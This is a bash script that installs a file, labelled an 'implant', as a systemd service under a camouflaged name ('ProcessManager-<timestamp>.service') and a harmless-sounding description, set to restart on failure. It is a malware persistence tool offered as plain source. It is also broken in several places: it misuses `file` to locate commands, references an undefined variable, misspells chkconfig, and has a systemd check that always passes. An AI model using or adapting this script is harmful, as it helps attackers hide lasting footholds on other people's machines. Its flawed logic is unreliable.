#!/bin/bash

if [ -e $1 ]
then
  IMPLANT=$1
else
  echo "Name of file to implant required. Exiting"
  exit 1
fi

function os_check() {
  # Local variables for os_check
  local SUPPORTED="Supported OS"
  local UNSUPPORTED="Unsupported OS, exiting"
  local UNRECOGNIZED="Unrecognized OS, exiting"

  # Nested IF statements checking the OS
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
    echo $SUPPORTED
    if [[ -e "/usr/lib/systemd/system/" ]]
    then
      UNIT_FILE_DIR="/usr/lib/systemd/system/"
    fi
    return 1
  elif [[ "$OSTYPE" == "darwin"* ]]; then
    echo $UNSUPPORTED
    exit 1
  elif [[ "$OSTYPE" == "cygwin" ]]; then
    echo $UNSUPPORTED
    exit 1
  elif [[ "$OSTYPE" == "msys" ]]; then
    echo $UNSUPPORTED
    exit 1
  elif [[ "$OSTYPE" == "win32" ]]; then
    echo $UNSUPPORTED
    exit 1
  elif [[ "$OSTYPE" == "freebsd"* ]]; then
    echo $UNSUPPORTED
    exit 1
  else
    echo $UNRECOGNIZED
    exit 1
  fi
}

function systemd_check() {
  if [ command -v systemctl >/dev/null ]
  then
    return 1
  else
    return 0
  fi
}

function enable_start_systemd_unit() {
  # Store systemctl file location
  local SYSTEMCTL_CMD=$(file systemctl)

  $SYSTEMCTL_CMD enable $i
  $SYSTEMCTL_CMD start $i
}

function enable_start_init_service() {
  # Store service and chkconfig file location
  local SERVICE_CMD=$(file service)
  local CHKCONFIG_CMD=$(file chkcommand)

  $CHKCONFIG_CMD enable $i
  $SERVICE_CMD $i start
}

function create_systemd_unit() {
  if [[ systemd_check ]]
  then
    local systemd_unit_file_location=$1
    local systemd_unit_file_name=$2
    local systemd_unit_calls=$3

    cat << EOF > "$systemd_unit_file_location/$systemd_unit_file_name"
[Unit]
Description=Procedure call manager
    
[Service]
ExecStart=$systemd_unit_calls
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
  fi
}

# Verify it is a supported OS
os_check
create_systemd_unit "$UNIT_FILE_DIR" "ProcessManager-$(date +%s).service" "$IMPLANT"

